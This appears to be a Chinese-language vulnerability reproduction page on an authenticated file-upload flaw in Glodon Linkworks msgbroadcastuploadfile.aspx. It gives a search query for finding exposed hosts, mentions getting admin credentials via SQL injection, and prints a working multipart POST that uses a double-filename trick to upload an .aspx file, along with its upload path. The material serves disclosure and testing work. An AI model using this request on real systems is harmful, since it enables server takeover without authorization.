---
title: "广联达 Linkworks msgbroadcastuploadfile.aspx 后台文件上传漏洞"
date: 2026-10-16 09:10:42
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "广联达-Linkworks"
tags:
  - "广联达-Linkworks"
  - "SQL注入"
  - "文件上传"
  - "漏洞复现"
---
## 漏洞描述

广联达 Linkworks msgbroadcastuploadfile.aspx 存在后台文件上传漏洞，攻击者通过SQL注入获取管理员信息后，可以登陆发送请求包获取服务器权限

## 漏洞影响

广联达 Linkworks

## 网络测绘

```
web.body="/Services/Identification/"
```

## 漏洞复现

登陆页面

![image-20230828150337640](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828150337640.png)

GTP.IM.Services.Group.WebSite.GTP.IM.Services.Group 存在文件上传，上传后在当前目录 Upload下

![image-20230828150355277](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828150355277.png)

通过SQL注入获取管理员账号密码后登陆后台上传文件,验证POC

```
POST /gtp/im/services/group/msgbroadcastuploadfile.aspx HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
Cookie: 0_styleName=styleA

------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; filename="1.aspx";filename="1.jpg"
Content-Type: application/text

Test

------WebKitFormBoundaryFfJZ4PlAZBixjELj--
```

![image-20230828150407255](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828150407255.png)

```
/GTP/IM/Services/Group/Upload/xxx-xxx-test.aspx
```

![image-20230828150419196](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828150419196.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E5%B9%BF%E8%81%94%E8%BE%BE-Linkworks-msgbroadcastuploadfile.aspx-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md)
